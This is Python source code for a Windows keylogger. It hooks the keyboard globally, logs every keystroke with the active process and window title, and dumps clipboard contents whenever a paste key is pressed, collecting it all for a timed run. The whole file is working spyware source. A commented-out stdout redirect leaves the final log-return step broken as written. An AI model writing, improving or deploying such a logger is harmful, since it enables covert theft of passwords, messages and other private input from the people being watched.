from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

# Windows only logger


class KeyLogger:
    def __init__(self) -> None:
        self.current_window = None

    def get_current_process(self):
        # get current window handle
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # get process if for current window
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)

        # get executable name for process id
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)

        # get windows title text
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f"{e}: window name unknown")

        print("\n", process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # key pressing handler
    def mykeystroke(self, event):

        # print(f"event.WindowName: {event.WindowName} self.current_window: {self.current_window}")
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
        return True

# actual main methoddd


def run():
    save_stdout = sys.stdout
    # redirect the whole out put to memory bufferd
    # disabled for testing
    # sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()

    # set handler
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()

    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == '__main__':
    print(run())
    print("done.")
